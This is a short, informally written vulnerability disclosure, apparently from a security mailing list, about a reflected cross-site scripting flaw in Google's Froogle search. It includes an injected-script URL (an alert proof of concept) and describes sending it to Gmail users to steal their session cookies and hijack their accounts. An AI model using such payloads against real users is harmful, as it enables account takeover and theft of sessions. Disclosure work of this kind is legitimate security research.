The flaw which was discovered by Nir Goldshlagger
and was tested many times.

hey this is Cross site Scripting In Froogle And its leads to steal the
cookie in gmail

if you send this link to the Victim in gmail email:

<<http://froogle.google.com/froogle?q=g&pid=4728103623836774439%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29;%3C/SCRIPT%3E>>

when he click this link you steal is cookie in gmail

And Even if the victim does change his password afterwards, it will be
to no avail. "The system authenticates the hacker as the victim, using
the stolen cookie file. Thus no password is involved in the
authentication process. The victim can change his password as many
times as he want, and it still won't stop the hacker from using his
box",

and even if the victim dosent save his cookie in gmail

when he click this cross site scripting link in his gmail account

its still steal his cookie

And if He Save His Cookie in gmail you can send this Cross site
scripting in any way you want to the victim
and its will steal his cookie
